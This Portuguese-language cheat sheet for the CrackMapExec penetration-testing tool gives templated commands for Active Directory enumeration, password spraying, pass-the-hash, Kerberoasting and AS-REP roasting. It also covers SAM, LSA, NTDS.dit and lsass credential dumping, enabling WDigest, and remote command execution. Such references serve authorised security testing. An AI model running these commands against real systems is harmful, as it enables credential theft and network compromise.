# cme

% cme, crackmapexec, windows, Active directory

## cme - Enumerar a rede e hosts
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : cme smb 192.168.1.0/24

https://mpgn.gitbook.io/crackmapexec/

```bash
cme smb <ip>
```

## cme - enumeração de politica de senhas
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
cme smb <ip> -u <user> -p '<password>' --pass-pol
```

## cme - enumeração de sessões vazias (sem necessidadade de usuario e senha)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u '' -p ''
```

## cme - enumeraçãop de logins anônimos
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u 'a' -p ''
```

## cme - enumeração de sessões ativas
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --sessions
```

## cme - enumeração de usuarios de domínio
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --users
```

# cme - enumeração de  usuarios via bruteforce de RID
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --rid-brute
```

## cme - enumeração de grupos do domínio
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --groups
```

## cme - enumeração de grupos locais
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --local-groups
```

## cme - enumeração de shares
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumeração das permissões em todos os shares

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --shares
```

## cme - enumeração de  discos
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumeração de discos no alvo remotos

```bash
cme smb <ip> -u <user> -p '<password>' --disks
```

## cme - enumeração smb do alvo com smb não assinado
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

Mapeia a rede listando hosts ativos e salva uma lista somente daqueles que não requerem assinatura SMB. A lista é formata com um IP por linha

```bash
cme smb <ip> --gen-relay-list smb_targets.txt
```

## cme - enumeração de usuários logados
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --loggedon-users
```

## cme - habilita o  wdigest
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

enable/disable the WDigest provider and dump clear-text credentials from LSA memory.
habilita/desabilita o provedor WDigest e realiza um dump de credenciais em texto plano da memoria do LSA.

```bash
cme smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## cme - desloga um usuário
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

Pode ser util depois de habilitar o wdigest para forçar o usuário a se reconectar.

```bash
cme smb <ip> -u <user> -p '<password>' -x 'quser'
cme smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## cme - autenticação local
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> --local-auth
```

## cme - autenticação local usando hash
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
cme smb <ip> -u <user> -H <hash> --local-auth
```

## cme - autenticação no dominio
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> -d <domain>
```

## cme - autenticação utilizando kerberos 
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
cme smb <ip> --kerberos
```

## cme - Dump SAM
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Realiza o dump das hashes do SAM usado metodos do secretsdump.py
É necessario ter no minimo privilégio de administrador local no alvo remoto, use a opção --local-auth se o usuario é uma conta local


```bash
cme smb <ip> -u <user> -p <password> -d <domain> --sam
```

## cme - Dump LSA
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Realiza o dump dos segredos do LSA usando metodos do secretsdump.py
É necessario ter privilégios de Domain Admin ou de Administrador Local no domain controller alvo


```bash
cme smb <ip> -u <user> -p <password> -d <domain> --lsa
```

## cme - dump ntds.dit
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Realiza o dump do NTDS.dit de um DC alvo usando metodos do secretsdump.py
Dump the NTDS.dit from target DC using methods from secretsdump.py
É necesssario ter privilégios de Domain Admin ou Administrador Local no domain controller alvo.

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --ntds
```

## cme - dump lsass
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> -u <user> -p <password> -d <domain> -M lsassy
```

## cme - dump lsass - with bloodhond update
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## cme - spraying de senhas (usuario=senha)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## cme - spraying de senhas com testes múltiplos 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

(tomar cuidado com o bloqueio de contas)

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## cme - insira um arquivo
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Envie um arquivo local para um alvo remoto

```bash
cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## cme - obter um file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Obtêm um arquivo remoto e o salva localmente

```bash
cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

## cme - enumeração de ASREPRoast sem autenticação
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

O usuario pode ser uma wordlist também (user.txt)
Formato do hashcat: hashcat -m 18200 

```bash
cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## cme - enumeração de ASREPRoast com autenticação
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  

Hashcat format  -m 18200 

```bash
cme ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## cme - Kerberoasting
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

Formato do hashcat: hashcat -m 13100

```bash
cme ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
```

## cme -  Delegação irrestrita - (Unconstrained delegation)
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

List of all computers et users with the flag TRUSTED_FOR_DELEGATION

Lista todos os computadores e usuarios com a flag "TRUSTED_FOR_DELEGATION"

```bash
cme ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

## cme - winrm-auth
#plateform/linux #target/remote #port/5985 #port/5986 #protocol/winrm #cat/ATTACK/CONNECT  

```bash
cme winrm <ip> -u <user> -p <password>
```

## cme - mssql password spray
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/BRUTEFORCE-SPRAY  

```bash
cme mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## cme - mssql execução de query
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## cme - mssql execução de comandos
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
```

= ip: 192.168.1.0/24
